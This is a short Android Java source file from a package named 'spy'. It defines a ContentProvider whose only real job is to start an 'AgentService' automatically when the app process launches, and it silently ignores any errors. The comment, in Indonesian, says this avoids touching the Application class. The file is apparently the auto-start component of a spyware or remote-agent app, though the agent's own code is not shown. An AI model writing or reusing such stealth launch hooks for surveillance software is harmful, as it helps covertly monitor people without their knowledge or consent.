package ai.m4zk1play.spy;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;

/** Pemicu start service tanpa menyentuh Application class. */
public class BootProvider extends ContentProvider {

    @Override
    public boolean onCreate() {
        Context ctx = getContext();
        if (ctx != null) start(ctx);
        return true;
    }

    public static void start(Context ctx) {
        try {
            Intent i = new Intent(ctx, AgentService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i);
            else ctx.startService(i);
        } catch (Exception ignored) {
        }
    }

    @Override public Cursor query(Uri u, String[] p, String s, String[] a, String o) { return null; }
    @Override public String getType(Uri u) { return null; }
    @Override public Uri insert(Uri u, ContentValues v) { return null; }
    @Override public int delete(Uri u, String s, String[] a) { return 0; }
    @Override public int update(Uri u, ContentValues v, String s, String[] a) { return 0; }
}
